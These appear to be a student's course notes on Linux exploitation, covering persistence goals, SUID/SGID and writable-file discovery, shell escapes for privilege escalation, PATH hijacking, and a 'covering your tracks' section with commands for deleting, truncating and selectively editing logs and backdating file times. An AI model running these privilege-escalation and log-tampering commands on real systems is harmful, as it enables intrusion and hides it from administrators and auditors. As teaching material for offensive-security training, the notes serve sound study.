linux exploitation
Objectives
Establish and maintain Linux persistence by:
    Adding or hijacking a user account
    Implementing boot process persistence
    Adding or modifying a CRON job
    Adding a kernel module (with a backdoor)
    Additional methods outside the scope of the SG

apt-get
apt-get changelog apt
!/bin/sh
---
What is SUID/SGID?
  User ID, Group ID

What are Capabilities?
  Things you are able to do

find / -type f -perm /6000 -ls 2>/dev/null  (BOTH)
find / -type f -perm /4000 -ls 2>/dev/null  (SUID Bit)
find / -type f -perm /2000 -ls 2>/dev/null  (SGID Bit)

nice /bin/sh -p

Insecure Permissions
CRON
World-Writable Files and Directories
Dot '.' in the PATH

echo $PATH
PATH=.:$PATH  <-- exploit world writable files
find / -type f -writable -o -type d -writable 2>/dev/null
find / -type f -perm /2 -o -type d -perm /2 2>/dev/null
crontab -e

vulnerable software
Unpatched Kernel Vulerabilities
Persistence
adding a user account
Boot Process Persistence

COVERING YOUR TRACKS
 Prior Initial Access? After Initial Access? Before Exit?
  -What logging?
  -Where are things?
  -File locals,names,times

Auditing SystemV
ausearch: Pulls from audit.log
ausearch -p 22
ausearch -m USER_LOGIN -sv no
ausearch -ua edwards -ts yesterday -te now -i

SystemD
Utilzes journalctl
journalctl _TRANSPORT=audit
journalctl _TRANSPORT=audit | grep 603

auth.log/secure  Logins/authentications
lastlog          Each users' last successful login time  
btmp             Bad login attempts
sulog            Usage of SU command
utmp             Currently logged in users (W command)
wtmp             Permanent record on user on/off

Working With Logs
file /var/log/wtmp
find /var/log -type f -mmin -10 2> /dev/null
journalctl -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4

Reading Files
cat /var/log/auth.log | egrep -v "opened|closed"
awk '/opened/' /var/log/auth.log
last OR lastb OR lastlog
strings OR dd            # for data files
more /var/log/syslog
head/tail
Control your output with pipes | and more

Cleaning The Logs
Before we start cleaning, save the INODE!

Cleaning The Logs (Basic)
Get rid of it
rm -rf /var/log/...
Clear It
cat /dev/null > /var/log/...
echo > /var/log/...

Cleaning The Logs (Precise)
Always work off a backup!
GREP (Remove)
egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
SED (Replace)
cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log

touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference
	Changing the change time requires changing the system time than touch the file. Could cause serious issues!


Rsyslog (remote system logging)
    Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
    Older version only uses /etc/rsyslog.conf
    Find out
    grep "IncludeConfig" /etc/rsyslog.conf
    Utilizes severity (priority) and facility levels
    Rules filter out, and can use keyword or number
<facility>.<priority>
EXAMPLE
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*.*  @192.168.10.254:514                                                    # Old format
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*









